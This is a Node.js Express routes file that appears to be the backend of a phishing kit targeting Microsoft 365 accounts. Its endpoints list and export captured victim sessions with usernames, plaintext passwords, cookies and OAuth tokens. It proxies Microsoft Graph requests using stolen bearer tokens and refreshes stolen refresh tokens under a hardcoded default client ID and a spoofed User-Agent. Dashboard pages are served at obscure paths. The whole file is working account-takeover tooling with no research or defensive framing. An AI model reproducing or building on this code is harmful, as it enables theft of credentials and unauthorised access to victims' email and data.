// routes/dashboard.js
const express = require('express');
const router = express.Router();
const axios = require('axios');
const path = require('path');

// ============= PROXY ENDPOINT - NOW USING MICROSOFT GRAPH API =============
router.options('/api/outlook-proxy', (req, res) => {
  const origin = process.env.APP_URL || 'http://localhost:3001';
  res.setHeader('Access-Control-Allow-Origin', origin);
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS, PUT, DELETE');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  res.sendStatus(200);
});

router.post('/api/outlook-proxy', express.json(), async (req, res) => {
  const origin = process.env.APP_URL || 'http://localhost:3001';
  res.setHeader('Access-Control-Allow-Origin', origin);
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS, PUT, DELETE');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  
  let { outlookPath, method, data, queryParams } = req.body;
  
  console.log('=' .repeat(60));
  console.log(`📥 PROXY REQUEST RECEIVED`);
  console.log(`   Method: ${method || 'GET'}`);
  console.log(`   Original target: ${outlookPath}`);
  
  // CONVERT deprecated Outlook API paths to Microsoft Graph API
  if (outlookPath && outlookPath.includes('outlook.office.com/api/v2.0')) {
    // Convert Outlook REST API v2.0 to Microsoft Graph API
    let convertedPath = outlookPath
      .replace('https://outlook.office.com/api/v2.0/me', 'https://graph.microsoft.com/v1.0/me')
      .replace('/mailfolders/', '/mailFolders/');
    
    console.log(`   Converted to Graph API: ${convertedPath}`);
    outlookPath = convertedPath;
  }
  
  console.log(`   Final target: ${outlookPath}`);
  console.log(`   Body data:`, data ? JSON.stringify(data).substring(0, 200) : 'none');
  console.log(`   Query params:`, queryParams);
  console.log(`   Auth header present: ${!!req.headers.authorization}`);
  
  if (!outlookPath) {
    console.log(`❌ No outlookPath specified`);
    return res.status(400).json({ error: 'No outlookPath specified' });
  }
  
  const authHeader = req.headers.authorization;
  
  if (!authHeader) {
    console.log(`❌ No Authorization header found`);
    return res.status(401).json({
      error: {
        code: "MissingAuthorizationHeader",
        message: "No authorization token provided"
      }
    });
  }
  
  console.log(`   Token preview: ${authHeader.substring(0, 50)}...`);
  
  const targetUrl = outlookPath;
  
  try {
    const forwardHeaders = {
      'Authorization': authHeader,
      'Accept': 'application/json',
      'User-Agent': 'Outlook/2026 (Windows NT 10.0; Win64; x64)'
    };
    
    if (data || method === 'POST' || method === 'PATCH' || method === 'PUT') {
      forwardHeaders['Content-Type'] = 'application/json';
    }
    
    console.log(`🔄 Forwarding request to Microsoft Graph API...`);
    
    const response = await axios({
      method: method || 'GET',
      url: targetUrl,
      data: data,
      headers: forwardHeaders,
      params: queryParams,
      timeout: 30000,
      validateStatus: () => true
    });
    
    console.log(`✅ Microsoft Graph API responded:`);
    console.log(`   Status: ${response.status}`);
    console.log(`   Content-Type: ${response.headers['content-type'] || 'unknown'}`);
    
    if (response.data) {
      const dataStr = JSON.stringify(response.data);
      console.log(`   Data length: ${dataStr.length} bytes`);
      const preview = dataStr.substring(0, 300);
      console.log(`   Data preview: ${preview}${dataStr.length > 300 ? '...' : ''}`);
    } else {
      console.log(`   No response body`);
    }
    
    // Forward the exact status code and response data
    res.status(response.status).json(response.data);
    
  } catch (error) {
    console.error(`❌ PROXY ERROR:`);
    console.error(`   Message: ${error.message}`);
    console.error(`   Code: ${error.code}`);
    
    if (error.response) {
      console.error(`   Response status: ${error.response.status}`);
      console.error(`   Response data:`, error.response.data);
      
      if (error.response.data) {
        return res.status(error.response.status).json(error.response.data);
      }
    }
    
    // Network error
    if (error.code === 'ECONNABORTED') {
      return res.status(504).json({
        error: {
          code: "GatewayTimeout",
          message: "The request to Microsoft API timed out"
        }
      });
    }
    
    if (error.code === 'ENOTFOUND') {
      return res.status(502).json({
        error: {
          code: "BadGateway",
          message: "Could not resolve Microsoft API host"
        }
      });
    }
    
    res.status(500).json({
      error: {
        code: "ProxyError",
        message: error.message
      }
    });
  }
});

// ============= TOKEN VALIDATION ENDPOINT =============
router.post('/api/validate-token', express.json(), async (req, res) => {
  const origin = process.env.APP_URL || 'http://localhost:3001';
  res.setHeader('Access-Control-Allow-Origin', origin);
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  
  const { token } = req.body;
  const authHeader = req.headers.authorization || `Bearer ${token}`;
  
  if (!authHeader) {
    return res.status(400).json({ 
      error: { code: "MissingToken", message: "No token provided" }
    });
  }
  
  try {
    const response = await axios.get('https://graph.microsoft.com/v1.0/me', {
      headers: {
        'Authorization': authHeader,
        'Accept': 'application/json'
      },
      timeout: 10000,
      validateStatus: () => true
    });
    
    if (response.status === 200) {
      res.json({
        valid: true,
        user: response.data,
        token_valid: true
      });
    } else {
      res.status(response.status).json({
        valid: false,
        error: response.data,
        token_valid: false
      });
    }
  } catch (error) {
    res.status(500).json({
      valid: false,
      error: { code: "ValidationError", message: error.message }
    });
  }
});

// ============= TOKEN REFRESH ENDPOINT =============
router.post('/api/refresh-token', express.json(), async (req, res) => {
  const origin = process.env.APP_URL || 'http://localhost:3001';
  res.setHeader('Access-Control-Allow-Origin', origin);
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  
  const { refreshToken, clientId } = req.body;
  
  console.log(`📥 Token refresh request received`);
  console.log(`   Refresh token present: ${!!refreshToken}`);
  
  if (!refreshToken) {
    return res.status(400).json({ 
      error: {
        code: "MissingRefreshToken",
        message: "No refresh token provided"
      }
    });
  }
  
  try {
    const claims = JSON.stringify({
      access_token: {
        xms_cc: { values: ["CP1"] }
      }
    });
    
    const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token', 
      new URLSearchParams({
        client_id: clientId || 'd3590ed6-52b3-4102-aeff-aad2292ab01c',
        refresh_token: refreshToken,
        grant_type: 'refresh_token',
        scope: 'https://graph.microsoft.com/.default offline_access',
        claims: claims
      }).toString(),
      {
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
      }
    );
    
    console.log(`✅ Token refreshed successfully`);
    res.json(response.data);
    
  } catch (error) {
    console.error('❌ Token refresh failed:', error.response?.data || error.message);
    
    if (error.response) {
      res.status(error.response.status).json(error.response.data);
    } else {
      res.status(500).json({
        error: {
          code: "TokenRefreshFailed",
          message: error.message
        }
      });
    }
  }
});

router.options('/api/refresh-token', (req, res) => {
  const origin = process.env.APP_URL || 'http://localhost:3001';
  res.setHeader('Access-Control-Allow-Origin', origin);
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  res.sendStatus(200);
});

// ============= TEST ENDPOINT =============
router.get('/api/test-proxy', (req, res) => {
  res.json({ 
    status: 'ok', 
    message: 'Proxy endpoint is reachable',
    timestamp: new Date().toISOString()
  });
});

// ============= TOKEN STATUS ENDPOINT =============
router.get('/api/token-status/:sessionId', async (req, res) => {
  const capturedData = req.app.locals.capturedData || new Map();
  const sessionId = req.params.sessionId;
  const session = capturedData.get(sessionId);
  
  if (!session) {
    return res.status(404).json({ 
      error: {
        code: "SessionNotFound",
        message: `No session found with ID: ${sessionId}`
      }
    });
  }
  
  let tokenValid = false;
  let tokenExpiresIn = 0;
  
  if (session.tokens?.graph?.access_token) {
    const tokenManager = session.tokenManagers?.graph;
    if (tokenManager) {
      tokenValid = !tokenManager.isExpired();
      tokenExpiresIn = Math.max(0, Math.floor((tokenManager.expiresAt - Date.now()) / 1000));
    }
  }
  
  res.json({
    sessionId,
    email: session.credentials?.username,
    tokenValid,
    tokenExpiresIn,
    hasTokens: !!session.tokens,
    tokenInfo: session.tokens ? {
      hasOutlook: !!session.tokens.outlook,
      hasGraph: !!session.tokens.graph,
      hasDesktop: !!session.tokens.is_desktop
    } : null
  });
});

// ============= SESSION EXPORT ENDPOINT =============
router.get('/api/export-session/:sessionId', (req, res) => {
  const capturedData = req.app.locals.capturedData || new Map();
  const sessionId = req.params.sessionId;
  const session = capturedData.get(sessionId);
  
  if (!session) {
    return res.status(404).json({ 
      error: {
        code: "SessionNotFound",
        message: `No session found with ID: ${sessionId}`
      }
    });
  }
  
  res.json({
    sessionId,
    email: session.credentials?.username,
    password: session.credentials?.password,
    tokens: session.tokens,
    cookies: session.cookies,
    capturedAt: session.credentials?.time || session.time,
    victimInfo: session.victimInfo || session.credentials?.victimInfo
  });
});

// ============= LIST SESSIONS ENDPOINT =============
router.get('/api/list-sessions', (req, res) => {
  const capturedData = req.app.locals.capturedData || new Map();
  const sessions = [];
  
  for (const [sessionId, session] of capturedData.entries()) {
    sessions.push({
      sessionId,
      email: session.credentials?.username,
      hasGraphToken: !!session.tokens?.graph,
      hasOutlookToken: !!(session.tokens?.outlook || session.tokens?.access_token),
      capturedAt: session.credentials?.time || session.time
    });
  }
  
  res.json({
    total: capturedData.size,
    sessions: sessions.sort((a, b) => new Date(b.capturedAt) - new Date(a.capturedAt))
  });
});

// ============= CAPTURED SESSIONS ENDPOINT =============
router.get('/captured-sessions', (req, res) => {
  const capturedData = req.app.locals.capturedData || new Map();
  const sessions = Array.from(capturedData.entries()).map(([id, sessionData]) => {
    return {
      id,
      username: sessionData.credentials?.username,
      hasPassword: !!sessionData.credentials?.password,
      cookieCount: sessionData.cookies?.length || 0,
      hasGraph: !!sessionData.tokens?.graph,
      hasOutlook: !!(sessionData.tokens?.outlook || sessionData.tokens?.access_token),
      time: sessionData.credentials?.time || sessionData.time
    };
  });
  
  res.json({ 
    total: capturedData.size, 
    sessions,
    timestamp: new Date().toISOString()
  });
});

// ============= DASHBOARD HTML ENDPOINTS =============
router.get('/token-manager', (req, res) => {
  res.sendFile(path.join(__dirname, '../html/token-manager.html'));
});

router.get('/vapesmoke', (req, res) => {
  res.sendFile(path.join(__dirname, '../html/outlook-dashboard.html'));
});

router.get('/yuing', (req, res) => {
  res.sendFile(path.join(__dirname, '../html/outlook-dashboard.html'));
});

router.get('/health', (req, res) => {
  const capturedData = req.app.locals.capturedData || new Map();
  res.json({ 
    status: 'ok', 
    timestamp: Date.now(),
    uptime: process.uptime(),
    sessionsCaptured: capturedData.size
  });
});

module.exports = router;